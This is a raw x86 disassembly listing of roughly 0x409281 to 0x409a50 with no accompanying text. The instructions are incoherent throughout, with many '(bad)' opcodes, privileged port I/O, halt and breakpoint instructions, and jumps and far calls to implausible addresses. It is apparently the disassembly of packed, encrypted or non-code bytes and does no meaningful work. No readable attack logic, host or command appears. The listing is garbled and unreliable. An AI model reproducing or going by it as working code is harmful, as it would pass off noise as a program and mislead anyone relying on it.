  409281:	fstp   DWORD PTR [ebp+0x75c257fd]
  409287:	sbb    edx,esi
  409289:	jo     0x40929a
  40928b:	je     0x4092a6
  40928d:	jb     0x4092e4
  40928f:	jmp    0x5acb:0xf60470c4
  409296:	icebp  
  409297:	ffreep st(0)
  409299:	sbb    eax,DWORD PTR [eax+0x7d]
  40929c:	mov    al,ds:0xb5e2e7d0
  4092a1:	repz jle 0x40931e
  4092a4:	loop   0x409277
  4092a6:	xchg   ebp,eax
  4092a7:	mov    dh,0xf5
  4092a9:	push   ebp
  4092aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4092ab:	inc    ecx
  4092ac:	or     DWORD PTR [ebx+0x24],esp
  4092af:	mov    ebp,ebp
  4092b1:	push   esp
  4092b2:	pop    esi
  4092b3:	(bad)  
  4092b4:	mov    ebx,0x483061ab
  4092b9:	iret   
  4092ba:	mov    ah,BYTE PTR [ebp-0x41bc03f9]
  4092c0:	rol    BYTE PTR [ebp-0xec14d0c],cl
  4092c6:	pop    esi
  4092c7:	inc    ebx
  4092c8:	enter  0x5b42,0x9b
  4092cc:	cmc    
  4092cd:	rcl    DWORD PTR [esi-0x9],cl
  4092d0:	xchg   ebx,eax
  4092d1:	add    BYTE PTR [edx+0x72],dh
  4092d4:	add    edi,DWORD PTR [eax-0x36]
  4092d7:	fsubr  st,st(0)
  4092d9:	mov    ah,0x6e
  4092db:	add    DWORD PTR [ebp-0x5534b8dd],0x2f
  4092e2:	xchg   esi,eax
  4092e3:	mov    al,ds:0xa3fdff01
  4092e8:	ja     0x409275
  4092ea:	lods   eax,DWORD PTR ds:[esi]
  4092eb:	or     eax,0x99b76222
  4092f0:	(bad)  
  4092f2:	dec    ecx
  4092f3:	dec    esi
  4092f4:	repnz and eax,0x5aa1d71
  4092fa:	pop    ecx
  4092fb:	mov    edi,esp
  4092fd:	mov    al,ds:0x42add369
  409302:	adc    edi,DWORD PTR [esi+edi*4]
  409305:	dec    edi
  409306:	retw   
  409308:	call   0xc38c:0x55676c6f
  40930f:	jl     0x409389
  409311:	aaa    
  409312:	push   edx
  409313:	clc    
  409314:	fs xchg edi,eax
  409316:	out    0x7b,al
  409318:	es cmp eax,0x8946dc17
  40931e:	mov    ds:0xb9529f84,eax
  409323:	pop    ds
  409324:	das    
  409325:	pop    ss
  409326:	mov    ebx,0xe1752866
  40932b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40932c:	jge    0x409365
  40932e:	and    DWORD PTR [eax],ecx
  409330:	sbb    cl,0x29
  409333:	das    
  409334:	mov    eax,ds:0x7e9f46ea
  409339:	out    0x9f,eax
  40933b:	push   0xffffff91
  40933d:	enter  0x37e,0xca
  409341:	mov    ah,0xeb
  409343:	ins    DWORD PTR es:[edi],dx
  409344:	mul    DWORD PTR [esp+eax*2-0xf90adba]
  40934b:	mov    bh,BYTE PTR [edi+0x10]
  40934e:	pop    edx
  40934f:	inc    ecx
  409350:	mov    bl,0x8b
  409352:	sti    
  409353:	test   eax,0x8229e9f8
  409358:	lahf   
  409359:	call   0x28d8:0x5df34101
  409360:	push   eax
  409361:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409362:	push   ebx
  409363:	leave  
  409364:	adc    BYTE PTR [edi-0x3],dh
  409367:	dec    eax
  409368:	mov    BYTE PTR [ecx-0x513c4514],dh
  40936e:	(bad)  
  40936f:	fild   DWORD PTR [esi]
  409371:	sbb    BYTE PTR [ebx-0x1af0e4ef],0x71
  409378:	mov    edx,0x3feb46e0
  40937d:	mov    ebx,0xce4ca17f
  409382:	jecxz  0x409373
  409384:	fcomp  QWORD PTR [edi+0x70]
  409387:	sbb    al,0x73
  409389:	sbb    ah,BYTE PTR [edx-0x58298c38]
  40938f:	enter  0x21b8,0x84
  409393:	and    al,BYTE PTR [edx+0x69]
  409396:	and    BYTE PTR [eax+eax*4-0x45],bl
  40939a:	xor    ebx,DWORD PTR [esi+0x1c]
  40939d:	jmp    FWORD PTR [edi-0x27]
  4093a0:	sar    BYTE PTR [eax-0x2f],1
  4093a3:	inc    esi
  4093a4:	hlt    
  4093a5:	arpl   WORD PTR [ebx-0x2643b641],dx
  4093ab:	arpl   WORD PTR [ebp-0x788be746],bp
  4093b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093b2:	adc    ebx,0x4ac20375
  4093b8:	lea    eax,[esi]
  4093ba:	clc    
  4093bb:	ja     0x409344
  4093bd:	shl    DWORD PTR [esi],cl
  4093bf:	in     eax,dx
  4093c0:	sub    al,0x3b
  4093c2:	adc    cl,BYTE PTR [esi-0x20a8ca96]
  4093c8:	cli    
  4093c9:	or     ch,BYTE PTR [ebp-0x78]
  4093cc:	cli    
  4093cd:	imul   edx,DWORD PTR [ebp-0x41525dc5],0x50
  4093d4:	pop    es
  4093d5:	add    DWORD PTR [eax-0x10],edi
  4093d8:	data16 sahf 
  4093da:	mov    WORD PTR ds:0x54be8833,ds
  4093e0:	pop    esi
  4093e1:	push   0x9d962caf
  4093e6:	inc    edi
  4093e7:	add    eax,0xc0c0d10a
  4093ec:	push   ebx
  4093ed:	sbb    ebp,esp
  4093ef:	mov    dl,0x53
  4093f1:	and    dh,BYTE PTR [ecx+0x77eb055c]
  4093f7:	and    eax,0xb74bfe77
  4093fc:	clc    
  4093fd:	inc    esi
  4093fe:	js     0x409426
  409400:	mov    edx,0x4bdb780c
  409405:	int3   
  409406:	popf   
  409407:	loope  0x4093b9
  409409:	push   0xe407f9a8
  40940e:	mov    bl,0x2a
  409410:	out    dx,eax
  409411:	aas    
  409412:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409413:	pop    esi
  409414:	shl    DWORD PTR [ebp+0x515067c2],cl
  40941a:	out    dx,al
  40941b:	push   cs
  40941c:	mov    edx,0xad9a1603
  409421:	repz rol BYTE PTR [edx],cl
  409424:	dec    edx
  409425:	fcomp  st(5)
  409427:	test   BYTE PTR [ecx-0x4ec49536],bh
  40942d:	mov    WORD PTR [edx],es
  40942f:	or     ecx,DWORD PTR [edi-0x6e]
  409432:	mov    ecx,0xa1871c35
  409437:	cmp    BYTE PTR [esi-0x4d],dh
  40943a:	loope  0x40942b
  40943c:	test   BYTE PTR [ebx],0xd0
  40943f:	cmp    BYTE PTR [edi+0x475bd5ed],ch
  409445:	jge    0x40948f
  409447:	out    dx,al
  409448:	dec    esi
  409449:	(bad)  
  40944a:	xor    ecx,eax
  40944c:	inc    eax
  40944d:	mov    eax,ds:0xb75e22b4
  409452:	pop    edi
  409453:	cmp    edx,DWORD PTR [ebp+0x18]
  409456:	lods   eax,DWORD PTR ds:[esi]
  409457:	push   esi
  409458:	cmp    eax,0xeed599d
  40945d:	fcmovu st,st(2)
  40945f:	pop    edx
  409460:	js     0x4094af
  409462:	push   ebp
  409463:	xchg   edi,eax
  409464:	and    eax,0xbe0b3b30
  409469:	scas   al,BYTE PTR es:[edi]
  40946a:	push   esi
  40946b:	xor    eax,0x5db395b8
  409470:	sub    al,0x40
  409472:	mov    cl,al
  409474:	nop
  409475:	adc    ebp,eax
  409477:	repz pop edi
  409479:	cmp    DWORD PTR [esi],ebx
  40947b:	shl    DWORD PTR [edx],1
  40947d:	(bad)
  409480:	jo     0x409441
  409482:	cmp    edi,DWORD PTR [esi+0x52246e48]
  409488:	dec    ebx
  409489:	fcmovb st,st(0)
  40948b:	rcl    DWORD PTR [edi],0x4a
  40948e:	add    DWORD PTR [esp+esi*4+0x2e],edx
  409492:	xchg   esp,eax
  409493:	mov    eax,0x9f45f13d
  409498:	ret    
  409499:	addr16 pop esp
  40949b:	ret    0x821d
  40949e:	outs   dx,BYTE PTR ds:[esi]
  40949f:	sbb    DWORD PTR [edx-0x43],eax
  4094a2:	call   0x7b3ecfe9
  4094a7:	daa    
  4094a8:	add    BYTE PTR [ebx+ecx*1-0x112f855b],0xdb
  4094b0:	pop    ebx
  4094b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094b2:	push   cs
  4094b3:	inc    ebx
  4094b4:	add    eax,0x4493067a
  4094b9:	push   ecx
  4094ba:	(bad)  
  4094bb:	or     dh,cl
  4094bd:	aas    
  4094be:	cdq    
  4094bf:	jp     0x1cc0700
  4094c5:	int    0x6
  4094c7:	fbld   TBYTE PTR [ecx+0x9]
  4094ca:	mov    dh,BYTE PTR ds:0x4167d002
  4094d0:	loop   0x4094be
  4094d2:	sub    eax,0x70bf3bab
  4094d7:	mov    edx,0x133d9570
  4094dc:	cmp    eax,0x2fd9b8cb
  4094e1:	fbld   TBYTE PTR [esi-0x3a72d66c]
  4094e7:	inc    ebx
  4094e8:	jns    0x40947d
  4094ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4094eb:	cwde   
  4094ec:	add    DWORD PTR ss:[ebx+eiz*2],eax
  4094f0:	xchg   DWORD PTR fs:[ebx],edx
  4094f3:	cmp    ecx,DWORD PTR [ebp-0x3e8e338]
  4094f9:	cmp    al,0x51
  4094fb:	xchg   edx,eax
  4094fc:	pop    ebx
  4094fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4094fe:	or     al,BYTE PTR [ecx+0x7f61a18]
  409504:	in     al,0x9f
  409506:	stos   DWORD PTR es:[edi],eax
  409507:	std    
  409508:	pushf  
  409509:	idiv   edx
  40950b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40950c:	shl    BYTE PTR [ecx],0xb9
  40950f:	inc    eax
  409510:	outs   dx,BYTE PTR ds:[esi]
  409511:	jnp    0x409532
  409513:	inc    edx
  409514:	add    eax,0xf5836863
  409519:	out    0x58,al
  40951b:	xchg   edx,eax
  40951c:	mov    eax,0x607d23eb
  409521:	shl    DWORD PTR [ebp+0x277931d4],0x17
  409528:	inc    ebp
  409529:	out    dx,eax
  40952a:	mov    ah,0x9b
  40952c:	jns    0x4094af
  40952e:	imul   BYTE PTR [edx]
  409530:	cmp    BYTE PTR [ecx],bh
  409532:	out    dx,al
  409533:	test   BYTE PTR [eax-0x55],bh
  409536:	xor    bh,BYTE PTR [ebx+0x63]
  409539:	xchg   DWORD PTR [esi+0x46a7dddf],ebx
  40953f:	sti    
  409540:	call   0xbfa9b30a
  409545:	inc    esi
  409546:	pop    ecx
  409547:	and    dh,ch
  409549:	pop    ebx
  40954a:	mov    edi,0x65847022
  40954f:	rcr    DWORD PTR [esi],1
  409551:	jae    0x40954c
  409553:	sbb    ebx,DWORD PTR [esi+esi*4]
  409556:	jge    0x4095a2
  409558:	cmc    
  409559:	retf   
  40955a:	dec    ebx
  40955b:	sbb    cl,BYTE PTR [esi-0x560a9761]
  409561:	jo     0x409509
  409563:	push   ebx
  409564:	mov    ds:0x6dc62059,eax
  409569:	fs ins DWORD PTR es:[edi],dx
  40956b:	repnz mov edi,0xc33be4ae
  409571:	pop    es
  409572:	ja     0x4095a4
  409574:	cdq    
  409575:	adc    eax,DWORD PTR [esi+0x79cd5108]
  40957b:	out    dx,al
  40957c:	add    al,0xcb
  40957e:	stos   DWORD PTR es:[edi],eax
  40957f:	sub    DWORD PTR [ecx],ecx
  409581:	loope  0x4095c3
  409583:	sti    
  409584:	repz xchg esp,eax
  409586:	mov    bl,0x2a
  409588:	mov    ds:0x2ac80c6,eax
  40958d:	jecxz  0x4095d9
  40958f:	test   al,0xc9
  409591:	jge    0x409571
  409593:	call   0xf802:0x83a53d07
  40959a:	jb     0x409611
  40959c:	scas   eax,DWORD PTR es:[edi]
  40959d:	mov    eax,0x1cbe39fc
  4095a2:	push   edi
  4095a3:	inc    eax
  4095a4:	jns    0x40952e
  4095a6:	inc    ebx
  4095a7:	retf   0x9843
  4095aa:	push   eax
  4095ab:	lods   eax,DWORD PTR ds:[esi]
  4095ac:	dec    ebp
  4095ad:	loop   0x409618
  4095af:	ins    DWORD PTR es:[edi],dx
  4095b0:	pop    DWORD PTR [edi+0x76]
  4095b3:	repnz sahf 
  4095b5:	dec    ebx
  4095b6:	mov    esp,0xa3cd423c
  4095bb:	jnp    0x4095b9
  4095bd:	and    bl,dl
  4095bf:	inc    eax
  4095c0:	(bad)  
  4095c1:	int3   
  4095c2:	cs xchg ebx,eax
  4095c4:	sbb    eax,0x72c7bdeb
  4095c9:	inc    ebp
  4095ca:	cmp    eax,0x6632c829
  4095cf:	mov    ah,0x85
  4095d1:	mov    al,0x90
  4095d3:	mov    dl,BYTE PTR [ebx+0x70]
  4095d6:	rcr    BYTE PTR [ebp+0x530bc00],0xd2
  4095dd:	aas    
  4095de:	mov    esi,edx
  4095e0:	mov    dl,0xc2
  4095e2:	adc    eax,0x526e0aea
  4095e7:	fwait
  4095e8:	int3   
  4095e9:	cmp    DWORD PTR [edx+0x20],esp
  4095ec:	addr16 mov esi,0x9bcd6fd1
  4095f2:	mov    al,ds:0xf158c112
  4095f7:	xlat   BYTE PTR ds:[ebx]
  4095f8:	lahf   
  4095f9:	call   0x195ddd6b
  4095fe:	(bad)  
  4095ff:	xor    eax,0x3e35ae1d
  409604:	fimul  WORD PTR [esi-0x67]
  409607:	inc    eax
  409608:	arpl   WORD PTR [ecx+0x3b8ea369],bx
  40960e:	dec    ecx
  40960f:	pusha  
  409610:	mov    bl,0x4f
  409612:	mov    bl,bl
  409614:	jb     0x4095fc
  409616:	or     BYTE PTR [ebx-0x5e],ch
  409619:	sub    DWORD PTR [ebx-0x7],ebx
  40961c:	ret    0xf442
  40961f:	sub    DWORD PTR [esi-0x43],ebx
  409622:	dec    edx
  409623:	not    DWORD PTR [ebx-0x5e]
  409626:	sub    eax,0xa2146da8
  40962b:	or     al,0x7b
  40962d:	test   esp,edx
  40962f:	cmp    eax,0xea75ef2f
  409634:	or     WORD PTR [ebp-0x6b432e10],ax
  40963b:	lods   eax,DWORD PTR ds:[esi]
  40963c:	scas   eax,DWORD PTR es:[edi]
  40963d:	jmp    0x4095cb
  40963f:	xchg   ecx,eax
  409640:	shr    DWORD PTR [eax],1
  409642:	(bad)
  409646:	pop    esi
  409647:	xor    cl,dh
  409649:	jmp    0x40962a
  40964b:	shr    DWORD PTR [edx+edi*2-0x7a1d079c],0xce
  409653:	pusha  
  409654:	fs sbb ebp,esp
  409657:	cmp    dl,ah
  409659:	fstp   DWORD PTR [eax-0x4b1ca573]
  40965f:	jp     0x409680
  409661:	aas    
  409662:	outs   dx,BYTE PTR ds:[esi]
  409663:	adc    edi,DWORD PTR [ebp-0x14]
  409666:	cmp    BYTE PTR [esi],0x9a
  409669:	ret    0x9fcd
  40966c:	fld    QWORD PTR [esi]
  40966e:	pop    edi
  40966f:	test   eax,0x3dc209b8
  409674:	das    
  409675:	aas    
  409676:	sbb    BYTE PTR [eax-0x26],al
  409679:	bound  eax,QWORD PTR [ecx]
  40967b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40967c:	retf   
  40967d:	pop    esi
  40967e:	or     BYTE PTR [ebp-0x77],al
  409681:	or     BYTE PTR [ebp-0x17],bl
  409684:	adc    edx,DWORD PTR [ecx]
  409686:	adc    al,0x96
  409688:	sti    
  409689:	retf   0x7ba
  40968c:	cwde   
  40968d:	iret   
  40968e:	ja     0x4096c5
  409690:	xor    BYTE PTR [ecx-0x65],bh
  409693:	je     0x409663
  409695:	aas    
  409696:	inc    esp
  409697:	jmp    0x409636
  409699:	xor    al,0x25
  40969b:	jg     0x4096f7
  40969d:	dec    ecx
  40969e:	push   edx
  40969f:	ss jle 0x4096d4
  4096a2:	dec    esp
  4096a3:	dec    ecx
  4096a4:	scas   al,BYTE PTR es:[edi]
  4096a5:	and    dh,BYTE PTR [esi+0x60]
  4096a8:	cmp    eax,0xb086551c
  4096ad:	add    BYTE PTR ds:[edx-0x59],al
  4096b1:	lods   al,BYTE PTR ds:[esi]
  4096b2:	sub    DWORD PTR [edx-0xa96ab1e],ebx
  4096b8:	int3   
  4096b9:	lahf   
  4096ba:	mov    cl,0xf0
  4096bc:	cmp    BYTE PTR [edx+eax*4],dl
  4096bf:	sub    ch,ah
  4096c1:	push   esp
  4096c2:	test   ch,dh
  4096c4:	das    
  4096c5:	ds mov esp,0x3d5d2f5e
  4096cb:	retf   0xf069
  4096ce:	retf   0x8857
  4096d1:	test   al,0x39
  4096d3:	aas    
  4096d4:	pop    edx
  4096d5:	gs pop ecx
  4096d7:	sub    ebx,DWORD PTR [edi+0x72]
  4096da:	adc    al,0x93
  4096dc:	xchg   edi,eax
  4096dd:	out    0x6b,al
  4096df:	and    eax,0x531ce9ae
  4096e4:	imul   ecx,DWORD PTR [edx-0x47],0x26
  4096e8:	jle    0x409749
  4096ea:	sub    bh,0x6a
  4096ed:	icebp  
  4096ee:	mov    esi,0x9f67285
  4096f3:	mov    cl,0xfe
  4096f5:	test   al,0xe1
  4096f7:	jle    0x40970b
  4096f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4096fa:	idiv   ah
  4096fc:	data16 mov fs,WORD PTR [eax+0x5efe0260]
  409703:	jb     0x4096b6
  409705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409706:	mov    dh,BYTE PTR [esi-0x551bbd1b]
  40970c:	xlat   BYTE PTR ds:[ebx]
  40970d:	push   ebx
  40970e:	mov    ecx,es
  409710:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409711:	pop    esp
  409712:	fwait
  409713:	push   cs
  409714:	push   ss
  409715:	icebp  
  409716:	pushf  
  409717:	cld    
  409718:	sub    cl,BYTE PTR [edi]
  40971a:	or     esp,esp
  40971c:	sub    eax,0x89ee1e97
  409721:	ror    BYTE PTR [eax-0x4262305b],cl
  409727:	add    ch,dl
  409729:	je     0x409730
  40972b:	lds    ecx,FWORD PTR [eax]
  40972d:	cmp    al,0x2f
  40972f:	xchg   DWORD PTR [eax+ebx*1],ecx
  409732:	push   edx
  409733:	cmp    eax,0xa82b734c
  409738:	lahf   
  409739:	stc    
  40973a:	mov    dh,0x28
  40973c:	ins    BYTE PTR es:[edi],dx
  40973d:	call   0x807f:0x7e7ff892
  409744:	inc    ecx
  409745:	mov    dh,0xca
  409747:	inc    edx
  409748:	jmp    DWORD PTR [esi+0x13]
  40974b:	test   ecx,esp
  40974d:	mov    WORD PTR [ebx-0x38f7eb8e],ds
  409753:	and    ch,0x3e
  409756:	pop    fs
  409758:	add    al,0x64
  40975a:	fsubr  QWORD PTR [esi-0x3dcdb98a]
  409760:	inc    esp
  409761:	out    dx,eax
  409762:	out    0x6b,al
  409764:	push   eax
  409765:	xchg   esp,eax
  409766:	xor    esi,ecx
  409768:	sbb    eax,0x9cd9ca9
  40976d:	cmc    
  40976e:	push   cs
  40976f:	rol    ebp,cl
  409771:	sar    DWORD PTR [ecx-0x4512d033],0x22
  409778:	mov    bl,0x6d
  40977a:	lds    edi,FWORD PTR [eax+0x59]
  40977d:	jno    0x4097fa
  40977f:	(bad)  
  409781:	push   esp
  409782:	aas    
  409783:	enter  0x6d3b,0x23
  409787:	xchg   edi,eax
  409788:	mov    ebp,0xf395785c
  40978d:	xor    DWORD PTR [ebp-0x45],0x7471f15
  409794:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409795:	jb     0x409796
  409797:	or     BYTE PTR [esi-0x76],ch
  40979a:	pop    ebx
  40979b:	sbb    eax,0xdcab88f1
  4097a0:	in     al,0xf9
  4097a2:	inc    esp
  4097a3:	mov    WORD PTR [edx+ebp*2-0x5b946f7e],cs
  4097aa:	jge    0x5edbb368
  4097b0:	dec    eax
  4097b1:	pop    es
  4097b2:	jge    0x40978e
  4097b4:	aam    0x97
  4097b6:	jo     0x409757
  4097b8:	out    dx,eax
  4097b9:	les    ebp,FWORD PTR [ecx+esi*8]
  4097bc:	xchg   BYTE PTR ds:[ebp-0xc],bh
  4097c0:	xchg   esi,eax
  4097c1:	adc    eax,0x472409fd
  4097c6:	iret   
  4097c7:	adc    eax,0xa697ead1
  4097cc:	addr16 inc esp
  4097ce:	mov    ecx,edx
  4097d0:	adc    edi,ebx
  4097d2:	hlt    
  4097d3:	loope  0x4097d8
  4097d5:	pop    ecx
  4097d6:	and    esi,esp
  4097d8:	lods   al,BYTE PTR ds:[esi]
  4097d9:	test   BYTE PTR [edi],dl
  4097db:	jb     0x40981a
  4097dd:	jg     0x4097ca
  4097df:	push   ds
  4097e0:	out    0x49,eax
  4097e2:	push   ecx
  4097e3:	pusha  
  4097e4:	gs retf 0x9c5f
  4097e8:	sar    BYTE PTR [ecx+ebx*2-0x37aa7080],0x78
  4097f0:	test   eax,0xc9e7560a
  4097f5:	sub    DWORD PTR [ebp+0x6ed03808],ecx
  4097fb:	sub    al,0x8d
  4097fd:	add    dl,BYTE PTR [ecx+eiz*1+0x5d]
  409801:	inc    esi
  409802:	aad    0x7d
  409804:	hlt    
  409805:	loopne 0x40984e
  409807:	stos   DWORD PTR es:[edi],eax
  409808:	test   dh,ch
  40980a:	ins    BYTE PTR es:[edi],dx
  40980b:	dec    ebp
  40980c:	mov    ch,0x2c
  40980e:	xchg   ecx,eax
  40980f:	(bad)  
  409811:	dec    edx
  409812:	sbb    al,0x56
  409814:	push   cs
  409815:	(bad)  
  409816:	dec    eax
  409817:	call   0xaae0:0xcbbc6f80
  40981e:	(bad)  
  40981f:	outs   dx,DWORD PTR ds:[esi]
  409820:	inc    ecx
  409821:	dec    ebx
  409822:	sub    al,BYTE PTR [edx]
  409824:	xchg   edx,eax
  409825:	imul   esi,ebp,0xffffff8e
  409828:	mov    edx,0xaa5461ae
  40982d:	(bad)  
  40982e:	pop    eax
  40982f:	mov    eax,ds:0x6a5a115d
  409834:	fcomp  DWORD PTR [ecx+0x6f30f228]
  40983a:	xchg   edi,eax
  40983b:	loop   0x409810
  40983d:	mov    ds,WORD PTR [edx+0x68]
  409840:	sti    
  409841:	push   ecx
  409842:	pop    edi
  409843:	in     al,dx
  409844:	add    eax,0x73e531af
  409849:	inc    edx
  40984a:	(bad)  
  40984b:	pop    eax
  40984c:	jp     0x409827
  40984e:	pop    esi
  40984f:	or     ebx,DWORD PTR [edi]
  409851:	xchg   edx,eax
  409852:	popf   
  409853:	lds    esp,FWORD PTR [ebp+0x18]
  409856:	sub    al,0xba
  409858:	cwde   
  409859:	into   
  40985a:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40985c:	ficomp WORD PTR [edi+0x13]
  40985f:	xchg   ebx,eax
  409860:	inc    ecx
  409861:	fwait
  409862:	mov    dh,0xd5
  409864:	push   es
  409865:	call   DWORD PTR [edi]
  409867:	mov    esi,0x57652e58
  40986c:	jecxz  0x4097fe
  40986e:	push   0x1e
  409870:	loop   0x409804
  409872:	xchg   edi,edx
  409874:	sbb    DWORD PTR [ebx+eiz*2-0x10a67c57],edx
  40987b:	addr16 je 0x409894
  40987e:	popa   
  40987f:	push   es
  409880:	es (bad) 
  409882:	xlat   BYTE PTR ds:[ebx]
  409883:	shr    DWORD PTR [ebx-0x31],1
  409886:	dec    edi
  409887:	imul   esi,DWORD PTR [ebx+0x71004d99],0x61bda7ca
  409891:	loope  0x409816
  409893:	push   es
  409894:	cli    
  409895:	hlt    
  409896:	retf   
  409897:	pinsrw mm0,ebp,0x45
  40989b:	inc    esp
  40989d:	(bad)  
  40989e:	push   ebp
  40989f:	jns    0x4098c3
  4098a1:	adc    eax,0x96bd0be4
  4098a6:	ins    DWORD PTR es:[edi],dx
  4098a7:	or     eax,DWORD PTR [esi-0x70069af5]
  4098ad:	and    cl,BYTE PTR [ecx-0x1b2daf6c]
  4098b3:	jo     0x409872
  4098b5:	in     eax,dx
  4098b6:	xchg   edx,eax
  4098b7:	push   esp
  4098b8:	pop    esp
  4098b9:	add    ecx,DWORD PTR [edx]
  4098bb:	retf   
  4098bc:	or     ecx,DWORD PTR [esi-0x2139a421]
  4098c2:	gs ret 
  4098c4:	adc    BYTE PTR [eax+0x6a5d80c6],ah
  4098ca:	xlat   BYTE PTR ds:[ebx]
  4098cb:	xor    ebp,DWORD PTR [eax+0xde199d4]
  4098d1:	push   ds
  4098d2:	and    DWORD PTR [eax+0x741510bd],edx
  4098d8:	pop    esi
  4098d9:	mov    al,ds:0x3b194204
  4098de:	cmp    al,0x41
  4098e0:	or     eax,0xd8f8f428
  4098e5:	addr16 sub al,0x67
  4098e8:	scas   eax,DWORD PTR es:[edi]
  4098e9:	adc    BYTE PTR [ebx-0x56],dl
  4098ec:	(bad)  [edx+0x4]
  4098ef:	stc    
  4098f0:	pop    edi
  4098f1:	fwait
  4098f2:	sbb    edi,DWORD PTR [ebx+0x8]
  4098f5:	les    eax,FWORD PTR [ebx+0x2e]
  4098f8:	xchg   ebx,eax
  4098f9:	push   0xd89cfc9d
  4098fe:	cmp    BYTE PTR [ecx],0x3b
  409901:	push   cs
  409902:	cld    
  409903:	jp     0x4098c6
  409905:	push   0xd81444a7
  40990a:	push   esi
  40990b:	aad    0x6
  40990d:	jp     0x40996c
  40990f:	cwde   
  409910:	jle    0x4098d7
  409912:	addr16 adc eax,0x8b87c823
  409918:	pop    ds
  409919:	jns    0x40994e
  40991b:	mov    ecx,0xe2ae9298
  409920:	mov    esp,ebx
  409922:	nop
  409923:	in     eax,0x5b
  409925:	or     al,0x43
  409927:	pop    edi
  409928:	push   esi
  409929:	push   esp
  40992a:	xchg   ebx,eax
  40992b:	stos   BYTE PTR es:[edi],al
  40992c:	xor    cl,0x45
  40992f:	xor    ch,BYTE PTR [ebp-0x21]
  409932:	loope  0x4098e4
  409934:	ins    DWORD PTR es:[edi],dx
  409935:	fcomi  st,st(3)
  409937:	or     bh,bl
  409939:	cmc    
  40993a:	adc    DWORD PTR [edi-0x6f7eceb5],ebp
  409940:	jbe    0x4098d5
  409942:	int3   
  409943:	mov    bh,0x16
  409945:	fistp  QWORD PTR [eax+0x3b748413]
  40994b:	sahf   
  40994c:	pop    eax
  40994d:	leave  
  40994e:	pop    eax
  40994f:	popf   
  409950:	int3   
  409951:	xchg   BYTE PTR [ecx+0x3a952cd6],ah
  409957:	cmp    bl,BYTE PTR [edx+0x47]
  40995a:	leave  
  40995b:	scas   eax,DWORD PTR es:[edi]
  40995c:	das    
  40995d:	ja     0x4098fa
  40995f:	jnp    0x409942
  409961:	inc    esi
  409962:	pop    ebp
  409963:	loopne 0x4098fd
  409965:	sbb    eax,0xd3c78003
  40996a:	cs (bad) 
  40996c:	adc    bh,dh
  40996e:	jg     0x4099d8
  409970:	adc    BYTE PTR [ecx+0x7dd5638f],ah
  409976:	pop    ebp
  409977:	cmp    DWORD PTR [eax-0x5ed347db],0xffffffd6
  40997e:	add    bh,cl
  409980:	cmc    
  409981:	sub    al,0x8a
  409983:	adc    DWORD PTR [edi-0x763e4ad7],edx
  409989:	das    
  40998a:	and    al,cl
  40998c:	in     al,dx
  40998d:	and    al,0x4c
  40998f:	pop    esi
  409990:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409991:	sub    DWORD PTR [eax+ebx*2],ecx
  409994:	in     eax,dx
  409995:	push   es
  409996:	(bad)  
  409997:	in     eax,0x43
  409999:	and    eax,0x33253ae
  40999e:	sbb    DWORD PTR [ecx+ebp*8-0x5e],esi
  4099a2:	in     al,0xe0
  4099a4:	cmovg  esp,esp
  4099a7:	call   0x106a:0xb500d2e6
  4099ae:	mov    ebx,gs
  4099b0:	jle    0x409945
  4099b2:	inc    ecx
  4099b3:	dec    ebp
  4099b4:	shrd   DWORD PTR [ecx],ecx,0xa6
  4099b8:	and    al,0xa8
  4099ba:	xchg   esi,eax
  4099bb:	dec    ebp
  4099bc:	jns    0x409a34
  4099be:	rol    BYTE PTR ds:0xbdbe38d4,1
  4099c4:	gs sbb al,0xbf
  4099c7:	jle    0x409989
  4099c9:	adc    al,0xd0
  4099cb:	pop    edx
  4099cc:	or     DWORD PTR [edx],0xffffffa4
  4099cf:	in     eax,dx
  4099d0:	sub    BYTE PTR [esp+ebp*4-0xc],cl
  4099d4:	inc    edx
  4099d5:	outs   dx,BYTE PTR ds:[esi]
  4099d6:	pushf  
  4099d7:	dec    edi
  4099d8:	or     DWORD PTR [ebx+0x108d826],edx
  4099de:	pop    eax
  4099df:	cmp    eax,0x270a1b51
  4099e4:	xchg   DWORD PTR [ebx-0x551f7e78],ebp
  4099ea:	enter  0xe3f8,0xed
  4099ee:	lahf   
  4099ef:	sti    
  4099f0:	mov    eax,0x99093b6
  4099f5:	cmp    ah,BYTE PTR [ebx-0x493dbfe4]
  4099fb:	in     al,0x84
  4099fd:	pop    esi
  4099fe:	inc    eax
  4099ff:	xchg   ebx,eax
  409a00:	and    BYTE PTR [ecx+0x22],ch
  409a03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409a04:	push   edi
  409a05:	inc    esi
  409a06:	push   esi
  409a07:	mov    dl,0x5f
  409a09:	cmp    ebx,eax
  409a0b:	out    0xeb,eax
  409a0d:	or     DWORD PTR [eax],ebp
  409a0f:	lds    ecx,FWORD PTR ss:[edi+0x5e69b646]
  409a16:	push   0x57dc56
  409a1b:	mul    DWORD PTR [eax]
  409a1d:	dec    edi
  409a1e:	jecxz  0x409a24
  409a20:	scas   eax,DWORD PTR es:[edi]
  409a21:	push   ebp
  409a22:	sub    dh,BYTE PTR [ebp-0xa]
  409a25:	aas    
  409a26:	jecxz  0x409a70
  409a28:	cs pop ecx
  409a2a:	mov    ebx,0x5609ff3a
  409a2f:	mov    esp,0x6eefa349
  409a34:	jmp    0x6a9d:0xc66da995
  409a3b:	and    ah,bh
  409a3d:	jg     0x4099c8
  409a3f:	cdq    
  409a40:	jmp    0x6752d030
  409a45:	test   eax,0xd377ad7e
  409a4a:	inc    ecx
  409a4b:	loopne 0x409a6b
  409a4d:	cmp    eax,edx
  409a4f:	dec    eax
  409a50:	jmp    0xf45ca49f
